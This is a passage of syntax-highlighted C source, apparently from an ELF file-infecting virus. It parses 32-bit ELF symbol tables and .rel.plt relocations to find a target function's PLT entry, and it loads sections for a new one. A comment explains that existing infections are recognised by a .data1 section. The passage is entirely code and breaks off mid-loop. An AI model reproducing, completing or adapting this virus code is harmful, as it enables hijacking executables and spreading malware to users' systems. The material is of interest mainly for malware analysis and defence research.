    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">sym_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">symp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Sym</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">_strcmp</span><span class="sc10">(&amp;</span><span class="sc11">string</span><span class="sc10">[</span><span class="sc11">symp</span><span class="sc10">-&gt;</span><span class="sc11">st_name</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">sh_function</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">sym</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">symp</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">symp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">sym_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">sym</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">string_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_sym_number</span><span class="sc10">(</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sh_function</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdrp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SHT_DYNSYM</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">do_dyn_symtab</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sh_function</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">shdrp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">do_rel</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Rel</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">rel</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">relp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">rel</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Rel</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rel</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">rel_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rel</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">rel_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">relp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rel</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Rel</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ELF32_R_SYM</span><span class="sc10">(</span><span class="sc11">relp</span><span class="sc10">-&gt;</span><span class="sc11">r_info</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">relp</span><span class="sc10">-&gt;</span><span class="sc11">r_offset</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">rel</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">relp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">rel_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">rel</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_rel</span><span class="sc10">(</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">string</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sh_function</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdrp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">sym</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_sym_number</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sh_function</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sym</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">_strcmp</span><span class="sc10">(&amp;</span><span class="sc11">string</span><span class="sc10">[</span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_name</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">getdataseg</span><span class="sc10">()[</span><span class="sc11">REL_PLT</span><span class="sc10">]))</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">do_rel</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sym</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">shdrp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">load_section</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">section</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">section</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">section</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">section</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">_free</span><span class="sc10">(*</span><span class="sc11">section</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">load_bin</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">newsecstr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">sectionp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">strtabhdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">ehdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">do_elf_checks</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">plen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">phdr_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">phdr_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">slen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)*</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">slen</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">phdr_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**)*</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">shdr_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">section_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">section_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">strtabhdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shstrndx</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">section_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">string_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">string_error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/*
    virus detection is simple. if the .data1 section exists, skip.
*/</span><span class="sc0">
    </span><span class="sc11">shdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
